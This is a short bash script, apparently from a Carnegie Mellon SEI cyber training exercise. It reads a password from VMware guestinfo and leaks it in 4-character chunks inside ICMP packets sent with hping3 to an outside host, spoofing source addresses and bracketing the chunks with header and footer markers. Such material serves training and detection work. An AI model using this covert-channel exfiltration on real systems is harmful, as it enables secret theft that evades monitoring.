#! /bin/bash
#
# Copyright 2025 Carnegie Mellon University.
#
# NO WARRANTY. THIS CARNEGIE MELLON UNIVERSITY AND SOFTWARE ENGINEERING INSTITUTE MATERIAL IS FURNISHED ON AN "AS-IS" BASIS. CARNEGIE MELLON UNIVERSITY MAKES NO WARRANTIES OF ANY KIND, EITHER EXPRESSED OR IMPLIED, AS TO ANY MATTER INCLUDING, BUT NOT LIMITED TO, WARRANTY OF FITNESS FOR PURPOSE OR MERCHANTABILITY, EXCLUSIVITY, OR RESULTS OBTAINED FROM USE OF THE MATERIAL. CARNEGIE MELLON UNIVERSITY DOES NOT MAKE ANY WARRANTY OF ANY KIND WITH RESPECT TO FREEDOM FROM PATENT, TRADEMARK, OR COPYRIGHT INFRINGEMENT.
#
# Licensed under a MIT (SEI)-style license, please see license.txt or contact permission@sei.cmu.edu for full terms.
#
# [DISTRIBUTION STATEMENT A] This material has been approved for public release and unlimited distribution.  Please see Copyright notice for non-US Government use and distribution.
#
# This Software includes and/or makes use of Third-Party Software each subject to its own license.
# DM25-0166#



while true; do
    # Retrieve the password directly
    PASSWORD=$(vmware-rpctool "info-get guestinfo.zippassword")
    
    # Check if password was successfully retrieved
    if [ -z "$PASSWORD" ]; then
        echo "Password not found. Retrying in $INTERVAL seconds."
        sleep 10
        continue
    fi
    echo "Begin Password" > header
    echo "${PASSWORD:0:4}" > pt1
    echo "${PASSWORD:4:4}" > pt2
    echo "${PASSWORD:8:4}" > pt3
    echo "end transmission" > footer
    
    
    # Send "Begin password" message
    
    hping3 -1 -c 1 -V --spoof "10.2.2.200" -E header -d 14 123.45.67.100
    
    # Send each 4-char part of the password with increasing spoofed IPs
    hping3 -1 -c 1 -V --spoof "10.2.2.201" -E pt1 -d 4 123.45.67.100
    hping3 -1 -c 1 -V --spoof "10.2.2.202" -E pt2 -d 4 123.45.67.100
    hping3 -1 -c 1 -V --spoof "10.2.2.203" -E pt3 -d 4 123.45.67.100
    
    # Send "end transmission" message
    hping3 -1 -c 1 -V --spoof "10.2.2.200" -E footer -d 16 123.45.67.100
    
    # Wait for the specified interval before repeating
    sleep 30
done
